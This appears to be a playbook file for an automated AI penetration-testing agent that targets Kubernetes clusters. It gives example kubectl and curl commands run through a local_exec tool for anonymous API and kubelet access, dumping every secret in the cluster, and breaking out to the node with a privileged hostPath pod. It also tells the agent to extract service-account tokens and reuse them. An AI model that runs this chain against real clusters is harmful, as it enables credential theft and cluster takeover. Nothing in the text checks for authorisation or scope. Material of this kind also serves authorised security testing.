---
name: kubernetes
services: [kubernetes, kube-apiserver, kubelet]
summary: Kubernetes — anonymous API/kubelet, pod exec, privileged-pod node escape, secrets
---

# Kubernetes playbook

The win is API or kubelet access → run/exec a pod → read secrets and escape to the node. Use
`kubectl` via `local_exec`. The commands below are **examples** — compose your own.

## Reach the control plane
- Example: `local_exec("kubectl --server https://<host>:6443 --insecure-skip-tls-verify get pods -A")`
- Example (kubelet 10250): `local_exec("curl -sk https://<host>:10250/pods")`

look for: anonymous API access (`anonymous-auth=true`), an exposed kubelet, or a service-account
token you already hold.

## Secrets
- Example: `kubectl get secrets -A -o yaml` → SA tokens, registry creds, app secrets (base64)

look for: cluster-admin or namespace tokens, dockerconfig secrets.

## Exec / node escape
- Example: `kubectl exec` into a pod for in-cluster access; or schedule a privileged pod with
  `hostPath: /` mounted → break out to the node, then pivot the cluster

look for: permission to create/exec pods → node takeover.

## Kubelet RCE (10250)
A writable kubelet API runs commands in existing pods directly.

## Record
Node/cluster takeover = critical; `record_credential` extracted SA tokens and reuse them.
